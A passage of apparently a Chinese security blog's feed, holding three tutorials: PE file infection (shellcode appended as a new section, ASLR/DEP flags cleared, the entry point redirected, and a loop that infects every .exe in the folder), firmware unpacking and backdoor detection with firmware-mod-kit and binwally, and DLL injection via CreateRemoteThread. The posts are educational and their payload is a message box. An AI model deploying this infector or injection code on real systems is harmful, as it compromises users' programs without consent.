class="string">'s'</span>)</div><div class="line">			db(<span class="string">'u'</span>) db(<span class="string">'c'</span>) db(<span class="string">'c'</span>) db(<span class="string">'e'</span>) db(<span class="string">'s'</span>) db(<span class="string">'s'</span>) db(<span class="string">' '</span>) db(<span class="string">'!'</span>) db(<span class="number">0</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从以上代码可知，Shellcode 执行完后会 ret 到原入口地址（OEP）处继续执行。Shellcode 中 MessageBoxA 函数的地址和 OEP 只是占位符，需要在运行时修正这两个地址。</p>
<p>大多数程序都会加载 user32.dll， 并且在同一系统中，user32.dll 会被加载到自身固有的 ImageBase，而 MessageBoxA 是该动态链接库的一个导出函数，所以同一系统中运行的所有进程的 MessageBoxA 函数地址是相同的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//动态获取 MessageBoxA 函数地址</span></div><div class="line">	HMODULE hModule = LoadLibraryA(<span class="string">"user32.dll"</span>);</div><div class="line">	LPVOID lpAddress = GetProcAddress(hModule, <span class="string">"MessageBoxA"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//修改 shellcode 中 MessabeBoxA 和 OEP 的地址</span></div><div class="line">	HANDLE hHeap = HeapCreate(<span class="literal">NULL</span>,<span class="literal">NULL</span>,dwCodeSize);</div><div class="line">	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);</div><div class="line">	<span class="built_in">memcpy</span>(lpHeap,ShellcodeStart,dwCodeSize);</div><div class="line"></div><div class="line">	DWORD dwIncrementor = <span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(;dwIncrementor &lt; dwCodeSize; dwIncrementor++)&#123;</div><div class="line">		<span class="comment">//修改 MessageBoxA 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xAAAAAAAA</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//修改原 OEP 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xBBBBBBBB</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;</div><div class="line">			FreeLibrary(hModule);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//复制shellcode到新节区</span></div><div class="line">	DWORD dwSize = <span class="number">0</span>;</div><div class="line">	SetFilePointer(hFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FILE_END);</div><div class="line">	WriteFile(hFile,lpHeap,pNewSec-&gt;SizeOfRawData,&amp;dwSize,<span class="literal">NULL</span>);</div><div class="line">	HeapFree(hHeap,<span class="literal">NULL</span>,lpHeap);</div><div class="line">	HeapDestroy(hHeap);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修正 Shellcode 中地址之后将其复制到 PE 文件的末尾，首先使用 SetFilePointer() 函数将文件指针指向文件末尾，再通过 WriteFile() 函数将 Shellcode 函数写入文件。SetFilePointer() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">DWORD WINAPI <span class="title">SetFilePointer</span><span class="params">(</span></span></div><div class="line">	HANDLE hFile, <span class="comment">//A handle to the file</span></div><div class="line"> 	LONG   lDistanceToMove,</div><div class="line"> 	PLONG  lpDistanceToMoveHigh,</div><div class="line"> 	DWORD  dwMoveMethod <span class="comment">//The starting point for the file pointer move</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<h2 id="5-关闭目标程序-ASLR"><a href="#5-关闭目标程序-ASLR" class="headerlink" title="5. 关闭目标程序 ASLR"></a>5. 关闭目标程序 ASLR</h2><p>由于 Shellcode 中 MessageBoxA() 函数地址和原 OEP 都是硬编码的，而在 Windows Vista 系统开始都默认启用 ASLR，所以目标程序每次启动时加载到内存的地址(ImageBase)都不同，导致 Shellcode 在跳转至原入口地址时因地址错误而不能正常执行。</p>
<p>普通的 EXE 文件不存在 .reloc 节区，编译器默认情况下都启用 ASLR（“目属性/链接器/高级/随机基址” 可关闭 ASLR），所以编译生成的可执行文件会包含用于重定位的 .reloc 节区。PE 文件中与 ASLR 相关的字段主要有以下几个：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IMAGE_FILE_HEADER/Characteristics：关闭 ASLR 时才设置 IMAGE_FILE_RELOCS_STRIPPED 属性值    </div><div class="line">IMAGE_OPTIONAL_HEADER/DllCharacteristics：开启 ASLR 时才设置 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 属性值</div><div class="line">IMAGE_OPTIONAL_HEADER/DataDirectory[<span class="number">5</span>]：该字段为 Base Relocation Table，ASLR 关闭时该字段值为 <span class="number">0</span>。</div></pre></td></tr></table></figure></p>
<p>下面通过编程的方式关闭目标程序的 ASLR：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//关闭目标程序 ASLR</span></div><div class="line">	pNTHdr-&gt;FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span>;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span>;</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注：<br>IMAGE_OPTIONAL_HEADER/DllCharacteristics 中 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 为与 DEP 相关的属性值，开启 DEP 时会设置改属性值，同样可以用以下代码关闭目标程序的 DEP：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;</div></pre></td></tr></table></figure></p>
<h2 id="6-修改入口地址-OEP"><a href="#6-修改入口地址-OEP" class="headerlink" title="6. 修改入口地址 OEP"></a>6. 修改入口地址 OEP</h2><p>为了让新添加节区中的代码获得优先执行权，要把程序的入口地址设置为新节区的起始地址，即新节表中 VirtualAddress 的值。修改完后调用 FlushViewOfFile() 函数将对文件的修改写入到磁盘中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line"> 	...</div><div class="line">	<span class="comment">//设置新增节区起始地址为新的入口地址</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewSec-&gt;VirtualAddress;</div><div class="line"></div><div class="line">	FlushViewOfFile(pHdr,pNTHdr-&gt;OptionalHeader.SizeOfHeaders);</div><div class="line">	UnmapViewOfFile(pHdr);</div><div class="line">	CloseHandle(hMapFile);</div><div class="line">	CloseHandle(hFile);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h2><p>以下代码遍历当前目录下所有.exe 文件，并感染除程序自身外的所有.exe文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	WIN32_FIND_DATA FileInfo;</div><div class="line">	HANDLE hListFile;</div><div class="line">	TCHAR szFilePath[MAX_PATH];</div><div class="line">	TCHAR szCurrentPath[MAX_PATH];</div><div class="line">	TCHAR szCurrentModule[MAX_PATH];</div><div class="line"></div><div class="line">	<span class="comment">//获取当前目录</span></div><div class="line">	GetCurrentDirectory(MAX_PATH,szCurrentPath);</div><div class="line">	<span class="comment">//获取当前模块路径</span></div><div class="line">	GetModuleFileName(<span class="literal">NULL</span>,szCurrentModule,MAX_PATH);</div><div class="line">	lstrcpy(szFilePath,szCurrentPath);</div><div class="line">	lstrcat(szFilePath,<span class="string">L"\\*.exe"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//遍历当前目录并感染除自身外的所有.exe文件</span></div><div class="line">	hListFile = FindFirstFile(szFilePath,&amp;FileInfo);</div><div class="line">	<span class="keyword">if</span>(hListFile == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">do</span>&#123;</div><div class="line">			<span class="keyword">if</span>(!_tcsstr(szCurrentModule,FileInfo.cFileName))&#123;</div><div class="line">				<span class="comment">//感染目标文件</span></div><div class="line">				<span class="keyword">if</span> (!InfectFile(FileInfo.cFileName))&#123;</div><div class="line">					<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="keyword">while</span>(FindNextFile(hListFile,&amp;FileInfo));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-23/33815689.jpg" alt=""><br>完整代码可以在 <a href="https://github.com/0x4C43/InflectPE" target="_blank" rel="external">此链接</a> 下载。</p>
<hr>
<p>References:<br>[1] <a href="https://0x00sec.org/t/pe-file-infection/401" target="_blank" rel="external">PE File Infection</a><br>[2] 《小小黑客之路》<br>[3] 《黑客编辑揭秘与防范》<br>[4] 《逆向工程核心原理》</p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PE 文件 </tag>
            
            <tag> 添加节区 </tag>
            
            <tag> 病毒感染 </tag>
            
            <tag> 打补丁 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 firmware-mod-kit 修改固件]]></title>
      <url>/2017/0605/modify-firmware-using-firmwaremodkit/</url>
      <content type="html"><![CDATA[<p>firmware-mod-kit 工具包可用于提取固件中的文件系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p>
<p>该工具包支持以下固件：</p>
<blockquote>
<p>DD-WRT v23    tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24    tested<br>OpenWrt White Russian    tested<br>OpenWrt Kamikaze    untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt    untested - should work ok<br>HyperWrt    untested<br>Ewrt    untested<br>Sveasoft Alchemy    untested<br>Sveasoft Talisman    untested<br>Linksys / other vendor    not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G    untested - should work ok<br>ASUS WL-520G    untested - should work ok<br>ASUS WL-530G    supported<br>ASUS WL-550G    untested  - should work ok<br>Trendnet TEW-632BRP    tested<br>DLink DIR-615    untested<br>many others*    untested</p>
</blockquote>
<h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="external">google code</a> 下载    Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For Ubuntu: $ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</div><div class="line"></div><div class="line">cd firmware-mod-kit/src</div><div class="line">./configure &amp;&amp; make</div></pre></td></tr></table></figure></p>
<h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>firmware-mod-kit 中包含以下几个工具脚本：</p>
<blockquote>
<p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文件</p>
</blockquote>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-6-5/78163658.jpg" alt=""></p>
<h2 id="1-解包固件"><a href="#1-解包固件" class="headerlink" title="1.  解包固件"></a>1.  解包固件</h2><p>使用以下命令解包固件，firmware.bin 为需解包的固件，working_directory 为解包结果存储位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./extract_firmware.sh firmware.bin working_directory/</div></pre></td></tr></table></figure></p>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-6-5/6411506.jpg" alt=""></p>
<h2 id="2-重新打包固件"><a href="#2-重新打包固件" class="headerlink" title="2. 重新打包固件"></a>2. 重新打包固件</h2><p>修改完解包后的文件系统后，使用 build_firmware.sh 重新打包固件，新生成的固件将存在 output_directory 目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./build_firmware.sh output_directory/ working_directory/</div></pre></td></tr></table></figure></p>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-6-5/10177238.jpg" alt=""></p>
<h1 id="0x03-Directory-Tree-Diff-amp-amp-Fuzzy-Hashing"><a href="#0x03-Directory-Tree-Diff-amp-amp-Fuzzy-Hashing" class="headerlink" title="0x03 Directory Tree Diff &amp;&amp; Fuzzy Hashing"></a>0x03 Directory Tree Diff &amp;&amp; Fuzzy Hashing</h1><p>当我们发现下载的固件是被修改过时，可以使用 <a href="https://github.com/bmaia/binwally" target="_blank" rel="external">binwally</a> 将修改过的固件与<a href="https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">原版固件</a>对比，从而发现具体修改内容。</p>
<h2 id="1-解包固件-1"><a href="#1-解包固件-1" class="headerlink" title="1. 解包固件"></a>1. 解包固件</h2><p>可以看到固件编译日期为 2007-02-03，而文件系统的创建实际为 2017-06-05,说明固件中的文件系统被修改过。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-6-5/63948070.jpg" alt=""></p>
<h2 id="2-差异对比"><a href="#2-差异对比" class="headerlink" title="2. 差异对比"></a>2. 差异对比</h2><p>google 查找发现 openwrt-wrtsl54gs-squashfs.bin 固件有三个版本，分别为：</p>
<blockquote>
<p><a href="https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin</a><br> <a href="https://downloads.openwrt.org/whiterussian/0.9/micro/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/micro/openwrt-wrtsl54gs-squashfs.bin</a><br> <a href="https://downloads.openwrt.org/whiterussian/0.9/pptp/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/pptp/openwrt-wrtsl54gs-squashfs.bin</a></p>
</blockquote>
<p>使用 binwally 对比结果显示”default” 版本的相似性最高，可知，目标固件是 “default” 版本固件的修改版。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-6-5/59066778.jpg" alt=""><br>继续查看具体修改的文件为 /etc/profile 和 /bin/nc。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-6-5/31504566.jpg" alt=""></p>
<hr>
<p>References：<br>[1] <a href="https://code.google.com/archive/p/firmware-mod-kit/wikis/Documentation.wiki" target="_blank" rel="external">firmware-mod-kit - Documentation.wiki</a><br>[2] <a href="https://bitsum.com/firmware_mod_kit.htm" target="_blank" rel="external">Firmware Modification Kit</a><br>[3] <a href="http://blog.csdn.net/qq1084283172/article/details/68061957" target="_blank" rel="external">路由器逆向分析——firmware-mod-kit工具安装和使用说明</a><br>[4] <a href="https://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html" target="_blank" rel="external">Firmware Forensics: Diffs, Timelines, ELFs and Backdoors</a></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> firmware-mod-kit </tag>
            
            <tag> firmware </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DLL 注入之远程线程注入]]></title>
      <url>/2017/0510/dll-injection-remote-thread/</url>
      <content type="html"><![CDATA[<p>在 Windows 中有多种方法实现 DLL 注入，<a href="http://0x4c43.cn/2017/0508/dll-injection-windows-message-hook/">可以使用消息钩子注入 DLL</a>，但是通过消息钩子的方法可控性差，不能准确的注入到指定的进程中。而使用远程线程注入的方法可以实现准确地在指定时刻将 DLL 注入到指定的进程中，其可控性较好。</p>
<h1 id="0x01-注入原理"><a href="#0x01-注入原理" class="headerlink" title="0x01 注入原理"></a>0x01 注入原理</h1><p>使用 Windows 远程线程机制，在本地进程中通过 CreateRemoteThread 函数在其他进程中开启并运行一个线程。CreateRemoteThread 函数原型如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HANDLE WINAPI CreateRemoteThread (</div><div class="line">	HANDLE                  hProcess,	// 远程进程句柄</div><div class="line">	LPSECURITY_ATTRIBUTES  	lpThreadAttributes,	// 线程的安全属性</div><div class="line">	SIZE_T                  dwStackSize,		// 线程栈的大小</div><div class="line">	LPTHREAD_START_ROUTINE	lpStartAddress,  // 线程入口函数的起始地址</div><div class="line">	LPVOID                  lpParameter, 		// 传递给线程函数的参数</div><div class="line">	DWORD                   dwCreationFlags,	// 线程是否立即启动</div><div class="line">	LPDWORD                 lpThreadId		// 用于保存内核分配给线程的ID</div><div class="line">)；</div></pre></td></tr></table></figure></p>
<p>主要关注三个参数：hProcess、lpStartAddress 和 lpParameter。hProcess 是要执行线程的目标进程句柄；lpStartAddress 是线程函数的起始地址，且该函数必须位于目标进程内；lpParameter 是传递给线程函数的参数。</p>
<p>为了使远程进程加载 DLL，把 LoadLibrary 函数作为 CreateRemoteThread 的线程函数，要加载的 DLL 路径作为线程函数的参数即可。</p>
<blockquote>
<p>让远程进程执行 LoadLibrary 函数加载 DLL 文件，需解决两个问题：<br>1）获得远程进程中 LoadLibrary 函数的地址：Kernel32.dll 是系统基本库，且 Windows 系统中，所有进程加载 Kernel32.dll 模块基址是固定且一致的，所以只需获取本地进程中 LoadLibrary 地址。<br>2）向远程进程传递需加载 DLL 的路径：通过 Windows API 函数把路径写入远程进程中，使用以下API：OpenProcess、VirtualAllocEx、WriteProcessMemory、VirtualFreeEx。</p>
</blockquote>
<h1 id="0x02-注入过程"><a href="#0x02-注入过程" class="headerlink" title="0x02 注入过程"></a>0x02 注入过程</h1><h2 id="1-获取目标进程句柄"><a href="#1-获取目标进程句柄" class="headerlink" title="1. 获取目标进程句柄"></a>1. 获取目标进程句柄</h2><p>使用 OpenProcess 函数打开远程进程的句柄。访问权限 dwDesiredAccess 需要设置为 PROCESS_ALL_ACCESS。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">OpenProcess</span> <span class="params">(</span></span></div><div class="line">	DWORD 	dwDesiredAccess,	<span class="comment">// 指定所得句柄具有的访问权限</span></div><div class="line">	BOOL  	bInheritHandle,		<span class="comment">// 是否可被继承</span></div><div class="line">	DWORD 	dwProcessId		<span class="comment">// 指定要打开的进程ID</span></div><div class="line">);</div><div class="line"></div><div class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</div></pre></td></tr></table></figure></p>
<h2 id="2-在目标进程分配内存空间"><a href="#2-在目标进程分配内存空间" class="headerlink" title="2. 在目标进程分配内存空间"></a>2. 在目标进程分配内存空间</h2><p>使用 VirtualAllocEx 在目标进程中分配足够的内存空间，用于保存要加载 DLL 的路径。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">VirtualAllocEx</span> <span class="params">(</span></span></div><div class="line">	HANDLE 	hProcess,	<span class="comment">// 目标进程句柄</span></div><div class="line">	LPVOID	lpAddress,	<span class="comment">// 期望的起始地址，通常置为NULL</span></div><div class="line">	SIZE_T  dwSize,		<span class="comment">// 需分配的内存大小</span></div><div class="line">	DWORD  	flAllocationType, <span class="comment">// 分配内存空间的类型，取 MEM_COMMIT</span></div><div class="line">	DWORD 	flProtect		<span class="comment">// 内存访问权限，指定为可读可写：PAGE_READWRITE</span></div><div class="line">);</div><div class="line"></div><div class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div></pre></td></tr></table></figure></p>
<h2 id="3-写入-DLL-路径至目标进程"><a href="#3-写入-DLL-路径至目标进程" class="headerlink" title="3. 写入 DLL 路径至目标进程"></a>3. 写入 DLL 路径至目标进程</h2><p>用 WriteProcessMemory 函数把需加载的 DLL 路径写入到远程进程分配的内存空间。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory</span> <span class="params">(</span></span></div><div class="line">	HANDLE    hProcess,		<span class="comment">// 目标进程句柄</span></div><div class="line">	LPVOID    lpBaseAddress,	<span class="comment">// 目标进程内存空间首地址</span></div><div class="line">	LPCVOID   lpBuffer,		<span class="comment">// 需写入数据的内存空间地址</span></div><div class="line">	SIZE_T    nSize,			<span class="comment">// 需写入数据字节数</span></div><div class="line">	SIZE_T    *lpNumberOfBytesWritten	  <span class="comment">// 实际写入的字节数，设置为 NULL</span></div><div class="line">);</div><div class="line"></div><div class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<h2 id="4-获取-LoadLibraryW-地址"><a href="#4-获取-LoadLibraryW-地址" class="headerlink" title="4. 获取 LoadLibraryW 地址"></a>4. 获取 LoadLibraryW 地址</h2><p>Windows 系统中，LoadLibraryW 函数位于 kernel32.dll 中，并且系统核心 DLL 会加载到固定地址，所以系统中所有进程的 LoadLibraryW 函数地址是相同的。用 GetProcAddress 函数获取本地进程 LoadLibraryW 地址即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINAPI <span class="title">GetProcAddress</span> <span class="params">(</span></span></div><div class="line">	MODULE 	hModule,	  <span class="comment">// 模块句柄</span></div><div class="line">	LPCSTR 	lpProcName	<span class="comment">// 函数名</span></div><div class="line">);</div><div class="line"></div><div class="line">hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</div></pre></td></tr></table></figure></p>
<h2 id="5-在目标进程中运行远程线程"><a href="#5-在目标进程中运行远程线程" class="headerlink" title="5. 在目标进程中运行远程线程"></a>5. 在目标进程中运行远程线程</h2><p>使用 CreateRemoteThread 函数是目标进程调用 LoadLibraryW 函数加载 DLL。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<h1 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h1><h2 id="1-需注入-DLL-源码"><a href="#1-需注入-DLL-源码" class="headerlink" title="1. 需注入 DLL 源码"></a>1. 需注入 DLL 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Injectdll.dll</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</div><div class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvReserved)</span></span></div><div class="line">&#123;</div><div class="line">	TCHAR Msg[<span class="number">50</span>] = _T(<span class="string">"Inject to "</span>);</div><div class="line">	TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">if</span>(!GetModuleFileName(g_hMod, szPath, MAX_PATH))</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	_tcscat(Msg, szPath);</div><div class="line"></div><div class="line">	<span class="keyword">switch</span>( dwReason )</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  </div><div class="line">			OutputDebugString(<span class="string">L"Sucess inject &lt;Injectdll.dll&gt; !!"</span>);</div><div class="line">			MessageBox(<span class="literal">NULL</span>, Msg, TEXT(<span class="string">"InjectDll"</span>), MB_OK);  </div><div class="line">			<span class="keyword">break</span>;  </div><div class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH:  </div><div class="line">			MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"Dll unInjected!!!"</span>), TEXT(<span class="string">"InjectDll"</span>), MB_OK);  </div><div class="line">			<span class="keyword">break</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> TRUE;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
